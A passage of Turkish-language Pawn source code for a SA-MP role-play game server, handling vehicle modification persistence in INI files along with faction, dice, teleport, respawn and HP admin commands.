		  		ShowPlayerDialog(playerid, 205, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Mobilya", mstring, "Seç", "Ýptal");
	  		}
	  		else
	  		{
	  		    Hata(playerid, "Hatalý id belirttiniz.");
	  		    if(!IsValidDynamicObject(Mobilya[id][mobje])) printf("1");
			  	if(Mobilya[id][mvw] != GetPlayerVirtualWorld(playerid)) printf("2");
			  	if(Mobilya[id][mint] != GetPlayerInterior(playerid)) printf("3");
			  	if(Mobilya[id][mmodel] == 0) printf("4");
			}
		}
	}
	return 1;
}
forward BilgileriCek(vehicleid2);
public BilgileriCek(vehicleid2)
{
    new string[528], yazdir[256], vehicleid;
    vehicleid = Arac[vehicleid2][aid];
	format(string,sizeof(string),"aracmodifiye/%d.ini",vehicleid);
	new File: Dosya = fopen(string, io_read);
	if(!Dosya)
	{
	    Dosya = fopen(string, io_write);
	    if(Dosya) {
		    format(yazdir,sizeof(yazdir),"ModPaintjob=%d",AracModifiyeleri[vehicleid][ModPaintjob]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModSpoiler=%d",AracModifiyeleri[vehicleid][ModSpoiler]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModRoof=%d",AracModifiyeleri[vehicleid][ModRoof]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModLeftSideSkirt=%d",AracModifiyeleri[vehicleid][ModLeftSideSkirt]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModRightSideSkirt=%d",AracModifiyeleri[vehicleid][ModRightSideSkirt]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModExhaust=%d",AracModifiyeleri[vehicleid][ModExhaust]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModWheels=%d",AracModifiyeleri[vehicleid][ModWheels]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModFrontBumper=%d",AracModifiyeleri[vehicleid][ModFrontBumper]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModRearBumper=%d",AracModifiyeleri[vehicleid][ModRearBumper]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModStereo=%d",AracModifiyeleri[vehicleid][ModStereo]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModHydraulics=%d",AracModifiyeleri[vehicleid][ModHydraulics]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModNitro=%d",AracModifiyeleri[vehicleid][ModNitro]);
	        fwrite(Dosya,yazdir);
        }
	}
    if(Dosya) {
    	new key[ 256 ] , val[ 256 ];
    	new Data[ 256 ];
	    while ( fread( Dosya , Data , sizeof( Data ) ) )
		{
		    key = ini_GetKey( Data );
			if( strcmp( key , "ModPaintjob" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModPaintjob] = strval( val ); }
			if( strcmp( key , "ModSpoiler" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModSpoiler] = strval( val ); }
			if( strcmp( key , "ModRoof" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModRoof] = strval( val ); }
			if( strcmp( key , "ModLeftSideSkirt" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModLeftSideSkirt] = strval( val ); }
			if( strcmp( key , "ModRightSideSkirt" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModRightSideSkirt] = strval( val ); }
			if( strcmp( key , "ModExhaust" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModExhaust] = strval( val ); }
			if( strcmp( key , "ModWheels" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModWheels] = strval( val ); }
			if( strcmp( key , "ModFrontBumper" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModFrontBumper] = strval( val ); }
			if( strcmp( key , "ModRearBumper" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModRearBumper] = strval( val ); }
			if( strcmp( key , "ModStereo" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModStereo] = strval( val ); }
			if( strcmp( key , "ModHydraulics" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModHydraulics] = strval( val ); }
			if( strcmp( key , "ModNitro" , true ) == 0 ) { val = ini_GetValue( Data ); AracModifiyeleri[vehicleid][ModNitro] = strval( val ); }
		}
		fclose(Dosya);
 	}
	return 1;
}
stock CheckPlayerDistanceToVehicle(Float:radi, playerid, vehicleid)
{
	if(IsPlayerConnected(playerid))
	{
	    new Float:PX,Float:PY,Float:PZ,Float:SLN,Float:DL,Float:GN;
	    GetPlayerPos(playerid,PX,PY,PZ);
	    GetVehiclePos(vehicleid, SLN,DL,GN);
	    new Float:Distancex = (SLN-PX)*(SLN-PX)+(DL-PY)*(DL-PY)+(GN-PZ)*(GN-PZ);
	    if(Distancex <= radi*radi)
	    {
	        return 1;
	    }
	}
	return 0;
}

stock ModifiyeYap(playerid, model2, ucret, tip, zaman)
{
	Modifiyeli[kArac[playerid]] = 1;
	ModifiyeYapiyor[playerid] = 1;
	ModifiyeTip[playerid] = tip;
	ModifiyeZaman[playerid] = zaman;
	ModifiyeObje[playerid] = model2;
	ModifiyeUcret[playerid] = ucret;
	new mstring[64];
	if(GetPlayerCash(playerid) < ucret) return format(mstring, sizeof(mstring), "Yeterli paranýz yok.[$%d]",ucret),Hata(playerid, mstring);
	GivePlayerCash(playerid, -ucret);
	if(ModifiyeTip[playerid] == 6)
	{
	    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModExhaust] = ModifiyeObje[playerid];
		AddVehicleComponent(kArac[playerid], ModifiyeObje[playerid]);
	 	BilgileriKaydet(kArac[playerid]);
		ModifiyeYapiyor[playerid] = 0;
		ModifiyeTip[playerid] = 0;
		ModifiyeZaman[playerid] = 0;
		ModifiyeObje[playerid] = 0;
		kArac[playerid] = 0;
		ModifiyeUcret[playerid] = 0;
	}
	else if(ModifiyeTip[playerid] == 7)
	{
	    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModWheels] = ModifiyeObje[playerid];
		AddVehicleComponent(kArac[playerid], ModifiyeObje[playerid]);
	 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
		ModifiyeYapiyor[playerid] = 0;
		ModifiyeTip[playerid] = 0;
		ModifiyeZaman[playerid] = 0;
		ModifiyeObje[playerid] = 0;
		kArac[playerid] = 0;
		ModifiyeUcret[playerid] = 0;
	}
	else if(ModifiyeTip[playerid] == 8)
	{
	    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModFrontBumper] = ModifiyeObje[playerid];
		AddVehicleComponent(kArac[playerid], ModifiyeObje[playerid]);
	 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
		ModifiyeYapiyor[playerid] = 0;
		ModifiyeTip[playerid] = 0;
		ModifiyeZaman[playerid] = 0;
		ModifiyeObje[playerid] = 0;
		kArac[playerid] = 0;
		ModifiyeUcret[playerid] = 0;
	}
	else if(ModifiyeTip[playerid] == 9)
	{
	    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRearBumper] = ModifiyeObje[playerid];
		AddVehicleComponent(kArac[playerid], ModifiyeObje[playerid]);
	 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
		ModifiyeYapiyor[playerid] = 0;
		ModifiyeTip[playerid] = 0;
		ModifiyeZaman[playerid] = 0;
		ModifiyeObje[playerid] = 0;
		kArac[playerid] = 0;
		ModifiyeUcret[playerid] = 0;
	}
	else if(ModifiyeTip[playerid] == 10)
	{
	    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModStereo] = ModifiyeObje[playerid];
		AddVehicleComponent(kArac[playerid], ModifiyeObje[playerid]);
	 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
		ModifiyeYapiyor[playerid] = 0;
		ModifiyeTip[playerid] = 0;
		ModifiyeZaman[playerid] = 0;
		ModifiyeObje[playerid] = 0;
		kArac[playerid] = 0;
		ModifiyeUcret[playerid] = 0;
	}
	else if(ModifiyeTip[playerid] == 11)
	{
	    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModHydraulics] = ModifiyeObje[playerid];
		AddVehicleComponent(kArac[playerid], ModifiyeObje[playerid]);
	 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
		ModifiyeYapiyor[playerid] = 0;
		ModifiyeTip[playerid] = 0;
		ModifiyeZaman[playerid] = 0;
		ModifiyeObje[playerid] = 0;
		kArac[playerid] = 0;
		ModifiyeUcret[playerid] = 0;
	}
	else if(ModifiyeTip[playerid] == 12)
	{
	    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModNitro] = ModifiyeObje[playerid];
		AddVehicleComponent(kArac[playerid], ModifiyeObje[playerid]);
	 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
		ModifiyeYapiyor[playerid] = 0;
		ModifiyeTip[playerid] = 0;
		ModifiyeZaman[playerid] = 0;
		ModifiyeObje[playerid] = 0;
		kArac[playerid] = 0;
		ModifiyeUcret[playerid] = 0;
	}
	return 1;
}

forward BaslangictaYukle();
public BaslangictaYukle()
{
	for(new i = 0; i < MAX_VEHICLES; i++)
	{
	    if(i != INVALID_VEHICLE_ID && GetVehicleModel(i) != 0)
	    {
	        BilgileriCek(i);
	        ModifiyeleriYukle(i);
	    }
	}
}

forward ModifiyeYukle(vehicleid);
public ModifiyeYukle(vehicleid)
{
	BilgileriCek(vehicleid);
	ModifiyeleriYukle(vehicleid);
}

forward ModifiyeEdilmeyecekArac(vehicleid);
public ModifiyeEdilmeyecekArac(vehicleid)
{
	if(GetVehicleModel(vehicleid) == 403 || GetVehicleModel(vehicleid) == 406 ||  GetVehicleModel(vehicleid) == 407 ||  GetVehicleModel(vehicleid) == 408 || GetVehicleModel(vehicleid) == 414 || GetVehicleModel(vehicleid) == 416 || GetVehicleModel(vehicleid) == 417 || GetVehicleModel(vehicleid) == 423 ||
	GetVehicleModel(vehicleid) == 425 || GetVehicleModel(vehicleid) == 427 || GetVehicleModel(vehicleid) == 428 || GetVehicleModel(vehicleid) == 430 || GetVehicleModel(vehicleid) == 431 || GetVehicleModel(vehicleid) == 432 || GetVehicleModel(vehicleid) == 433 || GetVehicleModel(vehicleid) == 434 ||
	GetVehicleModel(vehicleid) == 435 || GetVehicleModel(vehicleid) == 437 || GetVehicleModel(vehicleid) == 443 || GetVehicleModel(vehicleid) == 444 || GetVehicleModel(vehicleid) == 446 || GetVehicleModel(vehicleid) == 447 || GetVehicleModel(vehicleid) == 448 || GetVehicleModel(vehicleid) == 449 ||
	GetVehicleModel(vehicleid) == 450 || GetVehicleModel(vehicleid) == 452 || GetVehicleModel(vehicleid) == 453 || GetVehicleModel(vehicleid) == 454 || GetVehicleModel(vehicleid) == 455 || GetVehicleModel(vehicleid) == 456 || GetVehicleModel(vehicleid) == 457 || GetVehicleModel(vehicleid) == 459 ||
 	GetVehicleModel(vehicleid) == 460 || GetVehicleModel(vehicleid) == 461 || GetVehicleModel(vehicleid) == 462 || GetVehicleModel(vehicleid) == 463 || GetVehicleModel(vehicleid) == 464 || GetVehicleModel(vehicleid) == 465 || GetVehicleModel(vehicleid) == 468 || GetVehicleModel(vehicleid) == 469 ||
 	GetVehicleModel(vehicleid) == 470 || GetVehicleModel(vehicleid) == 471 || GetVehicleModel(vehicleid) == 472 || GetVehicleModel(vehicleid) == 473 || GetVehicleModel(vehicleid) == 476 || GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 484 ||
	GetVehicleModel(vehicleid) == 486 || GetVehicleModel(vehicleid) == 487 || GetVehicleModel(vehicleid) == 488 || GetVehicleModel(vehicleid) == 493 || GetVehicleModel(vehicleid) == 494 || GetVehicleModel(vehicleid) == 495 || GetVehicleModel(vehicleid) == 497 || GetVehicleModel(vehicleid) == 498 ||
 	GetVehicleModel(vehicleid) == 499 || GetVehicleModel(vehicleid) == 501 || GetVehicleModel(vehicleid) == 502 || GetVehicleModel(vehicleid) == 503 || GetVehicleModel(vehicleid) == 504 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510 || GetVehicleModel(vehicleid) == 511 ||
 	GetVehicleModel(vehicleid) == 512 || GetVehicleModel(vehicleid) == 513 || GetVehicleModel(vehicleid) == 514 || GetVehicleModel(vehicleid) == 515 || GetVehicleModel(vehicleid) == 519 || GetVehicleModel(vehicleid) == 520 || GetVehicleModel(vehicleid) == 521 || GetVehicleModel(vehicleid) == 522 ||
 	GetVehicleModel(vehicleid) == 523 || GetVehicleModel(vehicleid) == 524 || GetVehicleModel(vehicleid) == 525 || GetVehicleModel(vehicleid) == 528 || GetVehicleModel(vehicleid) == 530 || GetVehicleModel(vehicleid) == 531 || GetVehicleModel(vehicleid) == 532 || GetVehicleModel(vehicleid) == 537 ||
 	GetVehicleModel(vehicleid) == 538 || GetVehicleModel(vehicleid) == 539 || GetVehicleModel(vehicleid) == 544 || GetVehicleModel(vehicleid) == 548 || GetVehicleModel(vehicleid) == 552 || GetVehicleModel(vehicleid) == 553 || GetVehicleModel(vehicleid) == 556 || GetVehicleModel(vehicleid) == 557 ||
 	GetVehicleModel(vehicleid) == 563 || GetVehicleModel(vehicleid) == 564 || GetVehicleModel(vehicleid) == 568 || GetVehicleModel(vehicleid) == 569 || GetVehicleModel(vehicleid) == 570 || GetVehicleModel(vehicleid) == 571 || GetVehicleModel(vehicleid) == 572 || GetVehicleModel(vehicleid) == 573 ||
 	GetVehicleModel(vehicleid) == 574 || GetVehicleModel(vehicleid) == 577 || GetVehicleModel(vehicleid) == 578 || GetVehicleModel(vehicleid) == 581 || GetVehicleModel(vehicleid) == 582 || GetVehicleModel(vehicleid) == 583 || GetVehicleModel(vehicleid) == 584 || GetVehicleModel(vehicleid) == 586)
	{
		return 1;
	}
 	if(GetVehicleModel(vehicleid) == 588 || GetVehicleModel(vehicleid) == 590 || GetVehicleModel(vehicleid) == 591 || GetVehicleModel(vehicleid) == 592 || GetVehicleModel(vehicleid) == 593 || GetVehicleModel(vehicleid) == 594 || GetVehicleModel(vehicleid) == 595 || GetVehicleModel(vehicleid) == 596 ||
 	GetVehicleModel(vehicleid) == 597 || GetVehicleModel(vehicleid) == 598 || GetVehicleModel(vehicleid) == 599 || GetVehicleModel(vehicleid) == 601 || GetVehicleModel(vehicleid) >= 604)
	{
		return 1;
 	}
 	return 0;
}

forward ModifiyeleriGuncelle();
public ModifiyeleriGuncelle()
{
	for(new i2; i2 < MAX_VEHICLES; i2++)
	{
	    if(i2 != INVALID_VEHICLE_ID && Modifiyeli[i2] == 1)
		{
	        new i = Arac[i2][aid];
	        new spoiler, roof, sideskirt, nitro, exhaust, wheels, stereo, hydraulics, front_bumper, rear_bumper;
        	spoiler = GetVehicleComponentInSlot(i2, CARMODTYPE_SPOILER);
        	if(AracModifiyeleri[i][ModSpoiler] != spoiler)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	roof = GetVehicleComponentInSlot(i2, CARMODTYPE_ROOF);
        	if(AracModifiyeleri[i][ModRoof] != roof)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	sideskirt = GetVehicleComponentInSlot(i2, CARMODTYPE_SIDESKIRT);
        	if(AracModifiyeleri[i][ModLeftSideSkirt] != sideskirt)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	exhaust = GetVehicleComponentInSlot(i2, CARMODTYPE_EXHAUST);
        	if(AracModifiyeleri[i][ModExhaust] != exhaust)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	wheels = GetVehicleComponentInSlot(i2, CARMODTYPE_WHEELS);
        	if(AracModifiyeleri[i][ModWheels] != wheels)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
            front_bumper = GetVehicleComponentInSlot(i2, CARMODTYPE_FRONT_BUMPER);
        	if(AracModifiyeleri[i][ModFrontBumper] != front_bumper)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	rear_bumper = GetVehicleComponentInSlot(i2, CARMODTYPE_REAR_BUMPER);
        	if(AracModifiyeleri[i][ModRearBumper] != rear_bumper)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	stereo = GetVehicleComponentInSlot(i2, CARMODTYPE_STEREO);
        	if(AracModifiyeleri[i][ModStereo] != stereo)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	hydraulics = GetVehicleComponentInSlot(i2, CARMODTYPE_HYDRAULICS);
        	if(AracModifiyeleri[i][ModHydraulics] != hydraulics)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
        	nitro = GetVehicleComponentInSlot(i2, CARMODTYPE_NITRO);
        	if(AracModifiyeleri[i][ModNitro] != nitro)
        	{
        	    ModifiyeleriYukle(i2);
        	    return 1;
        	}
		}
	}
	return 1;
}
forward ModifiyeleriYukle(aracid2);
public ModifiyeleriYukle(aracid2)
{
	new aracid = Arac[aracid2][aid];
	if(AracModifiyeleri[aracid][ModPaintjob] != 0)
	{
	    //ChangeVehicleColor(aracid2,1,1);
        ChangeVehiclePaintjob(aracid2, AracModifiyeleri[aracid][ModPaintjob]-1);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModSpoiler] > 0)
	{
		AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModSpoiler]);
		Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModRoof] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModRoof]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModLeftSideSkirt] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModLeftSideSkirt]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModRightSideSkirt] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModRightSideSkirt]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModExhaust] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModExhaust]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModWheels] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModWheels]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModFrontBumper] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModFrontBumper]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModRearBumper] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModRearBumper]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModStereo] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModStereo]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModHydraulics] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModHydraulics]);
        Modifiyeli[aracid2] = 1;
	}
	if(AracModifiyeleri[aracid][ModNitro] > 0)
	{
        AddVehicleComponent(aracid2, AracModifiyeleri[aracid][ModNitro]);
        Modifiyeli[aracid2] = 1;
	}
	ChangeVehicleColor(aracid2, Arac[aracid2][arenk1], Arac[aracid2][arenk2]);
}

forward BilgileriKaydet(aracid2);
public BilgileriKaydet(aracid2)
{
    new string[128], yazdir[256];
    new aracid = Arac[aracid2][aid];
	format(string,sizeof(string),"aracmodifiye/%d.ini",aracid);
	new File: Dosya = fopen(string, io_write);
	if (!Dosya)
	{
	    Dosya = fopen(string, io_write);
	    if(Dosya)
	    {
		    format(yazdir,sizeof(yazdir),"ModPaintjob=%d",AracModifiyeleri[aracid][ModPaintjob]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModSpoiler=%d",AracModifiyeleri[aracid][ModSpoiler]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModRoof=%d",AracModifiyeleri[aracid][ModRoof]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModLeftSideSkirt=%d",AracModifiyeleri[aracid][ModLeftSideSkirt]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModRightSideSkirt=%d",AracModifiyeleri[aracid][ModRightSideSkirt]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModExhaust=%d",AracModifiyeleri[aracid][ModExhaust]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModWheels=%d",AracModifiyeleri[aracid][ModWheels]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModFrontBumper=%d",AracModifiyeleri[aracid][ModFrontBumper]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModRearBumper=%d",AracModifiyeleri[aracid][ModRearBumper]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModStereo=%d",AracModifiyeleri[aracid][ModStereo]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModHydraulics=%d",AracModifiyeleri[aracid][ModHydraulics]);
	        fwrite(Dosya,yazdir);
	        format(yazdir,sizeof(yazdir),"ModNitro=%d",AracModifiyeleri[aracid][ModNitro]);
	        fwrite(Dosya,yazdir);
	   }
	}
	else if(Dosya)
	{
	    new yaz[32];
		format(yaz, 32, "ModPaintjob=%d\n",AracModifiyeleri[aracid][ModPaintjob]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModSpoiler=%d\n",AracModifiyeleri[aracid][ModSpoiler]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModRoof=%d\n",AracModifiyeleri[aracid][ModRoof]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModLeftSideSkirt=%d\n",AracModifiyeleri[aracid][ModLeftSideSkirt]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModRightSideSkirt=%d\n",AracModifiyeleri[aracid][ModRightSideSkirt]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModExhaust=%d\n",AracModifiyeleri[aracid][ModExhaust]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModWheels=%d\n",AracModifiyeleri[aracid][ModWheels]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModFrontBumper=%d\n",AracModifiyeleri[aracid][ModFrontBumper]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModRearBumper=%d\n",AracModifiyeleri[aracid][ModRearBumper]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModStereo=%d\n",AracModifiyeleri[aracid][ModStereo]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModHydraulics=%d\n",AracModifiyeleri[aracid][ModHydraulics]);
		fwrite(Dosya, yaz);
		format(yaz, 32, "ModNitro=%d\n",AracModifiyeleri[aracid][ModNitro]);
		fwrite(Dosya, yaz);
	}
	if(Dosya) fclose(Dosya);
}

stock ini_GetKey( line[] )
{
	new keyRes[256];
	keyRes[0] = 0;
    if ( strfind( line , "=" , true ) == -1 ) return keyRes;
    strmid( keyRes , line , 0 , strfind( line , "=" , true ) , sizeof( keyRes) );
    return keyRes;
}

stock ini_GetValue( line[] )
{
	new valRes[256];
	valRes[0]=0;
	if ( strfind( line , "=" , true ) == -1 ) return valRes;
	strmid( valRes , line , strfind( line , "=" , true )+1 , strlen( line ) , sizeof( valRes ) );
	return valRes;
}
CMD:birlikcik(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][birlik] == 0) return Hata(playerid, "Zaten bir birlikte bulunmuyorsunuz.");
	    new mstring[128];
	    format(mstring,sizeof(mstring), "%s isimli birlikten çýktýnýz.",Birlik[Karakter[playerid][birlik]][fisim]);
	    Bilgi(playerid, mstring);
 		Karakter[playerid][birlik] = 0;
		Karakter[playerid][rutbe] = 0;
	}
	return 1;
}
CMD:birlikcikar(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
		{
		    new pid;
		    if(sscanf(params, "i", pid)) return Ipucu(playerid, "/birlikcikar (playerid)");
		    if(!IsPlayerConnected(pid)) return Hata(playerid, "Yanlýþ id belirttiniz.");
		    Bilgi(playerid, "Oyuncuyu birliðinden çýkarttýnýz.");
		    new mstring[128];
		    format(mstring, sizeof(mstring), "%s sizi birliðinizden çýkarttý.", Karakter[playerid][anick]);
		    Bilgi(pid, mstring);
		    Karakter[pid][birlik] = 0;
			Karakter[pid][rutbe] = 0;
		}
	}
	return 1;
}
CMD:silahbak(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
		{
            new id;
		    if(sscanf(params, "i", id)) return Ipucu(playerid, "/silahbak (playerid)");
		    ShowGuns(playerid, id);
		}
	}
	return 1;
}
CMD:azarrak2(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
			new zar1,zar2,mesaj[128];
			if(sscanf(params, "ii", zar1,zar2)) return Ipucu(playerid, "/azarrak2 1 2");
	  		format(mesaj, sizeof(mesaj), "elindeki zarý yere doðru fýrlattý. (%d,%d)",zar1,zar2);
	  		ZarMesaj(playerid, 15.0, mesaj);
		}
	}
	return 1;
}
CMD:azarrak(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
			new zar1,mesaj[128];
			if(sscanf(params, "i", zar1)) return Ipucu(playerid, "/azarrak2 1");
			format(mesaj, sizeof(mesaj), "elindeki zarý yere doðru fýrlattý. (%d)",zar1);
			ZarMesaj(playerid, 15.0, mesaj);
		}
	}
	return 1;
}
CMD:arenk(playerid, params[])
{
	if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid,"Araç içerisinde olmanýz gerekmektedir.");
		new
			string[80],
		    colour1,
			colour2;
		if(sscanf(params,"dd", colour1, colour2)) return Ipucu(playerid, "/arenk [renk1] [renk2]");
  		Arac[GetPlayerVehicleID(playerid)][arenk1] = colour1;
		Arac[GetPlayerVehicleID(playerid)][arenk2] = colour2;
		ChangeVehicleColor(GetPlayerVehicleID(playerid),Arac[GetPlayerVehicleID(playerid)][arenk1],Arac[GetPlayerVehicleID(playerid)][arenk2]);
    	AracKaydet(GetPlayerVehicleID(playerid));
		format(string, sizeof(string), "Araç rengini baþarýyla deðiþtirdiniz.");
		Bilgi(playerid, string);
	}
	return 1;
}
CMD:rac(playerid, params[])
{
	return cmd_respawnallcars(playerid,params);
}
CMD:respawnallcars(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
		{
			new sec,mstring[128];
    		if(sscanf(params,"d",sec)) return Kullanim(playerid, "/respawnallcars (saniye)");
    		SetTimer("vrespawn", sec*1000, false);
    		format(mstring, sizeof(mstring), "[!] \"%s\" tarafýndan kullanýlmayan tüm araçlar [%d] saniye içinde respawn edilecektir.", Karakter[playerid][anick], sec);
	     	for(new i; i < MAX_PLAYERS; i++)
	       	{
				if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
	       		PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
	      		SendClientMessage(i, COLOR_ORANGE, mstring);
			}
		}
	}
	return 1;
}
CMD:gonderganton(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if((Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1) || Karakter[playerid][tester] >= 2)
		{
			new id;
		    if(sscanf(params, "i", id)) return Kullanim(playerid, "/gonderganton (oyuncuID)");
			if(Karakter[playerid][tester] >= 2 && Karakter[id][adminlevel] >= 1) return Hata(playerid, "Admini LS gönderemezsiniz.");
		    SetPlayerPos(id, 2094.5486,-1806.4009,13.5507);
		    SetPlayerVirtualWorld(id, 0);
		    SetPlayerInterior(id, 0);
			Bilgi(playerid, "Oyuncuyu Idlewood'a ýþýnladýnýz.");
			new mstring[128];
		    format(mstring, sizeof(mstring), "%s sizi Idlewood'a ýþýnladý.",OyuncuAdiniBul(playerid));
			Bilgi(id, mstring);
		}
	}
	return 1;
}
CMD:sethpall(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
		{
		    new Float:hp2;
		    if(sscanf(params, "f", hp2)) return Ipucu(playerid, "/sethpall (hp)");
		    new mstring[128];
		    format(mstring, sizeof(mstring), "[!] \"%s\" tarafýndan tüm oyuncularýn HP deðeri [%.0f] olarak düzenledi.", Karakter[playerid][anick], hp2);
     		for(new i; i < MAX_PLAYERS; i++)
	       	{
				if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
	       		PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
